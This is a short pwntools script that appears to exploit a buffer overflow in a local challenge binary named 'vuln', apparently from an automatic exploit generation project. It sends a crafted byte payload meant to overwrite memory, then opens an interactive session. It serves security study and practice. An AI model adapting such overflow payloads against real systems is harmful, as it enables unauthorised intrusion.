from pwn import * 
elf = process('/home/aditya/Documents/UGRC/bof_aeg/challenges/vuln')
inp = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7c\x01\x4e\x89\x5b\x55\x00\x00'
#attach gdb
#set context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(elf)
elf.sendline(inp)
elf.interactive()